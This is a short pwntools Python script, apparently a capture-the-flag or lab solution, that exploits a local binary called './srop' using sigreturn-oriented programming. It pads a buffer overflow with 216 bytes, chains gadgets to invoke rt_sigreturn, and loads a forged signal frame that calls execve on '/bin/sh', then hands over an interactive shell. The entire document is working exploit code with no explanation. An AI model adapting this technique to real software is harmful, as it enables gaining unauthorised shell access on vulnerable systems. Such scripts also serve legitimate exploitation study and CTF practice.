import pwn
from pwn import *
context.arch = "amd64"
elf = context.binary = ELF("./srop")
p = process()
#p = gdb.debug("./srop")

POP_RAX = 0x4011b1
SYSRET = 0x4011b3
BIN_SH = 0x402014

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = BIN_SH
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSRET

payload = b"A"*216
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSRET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()

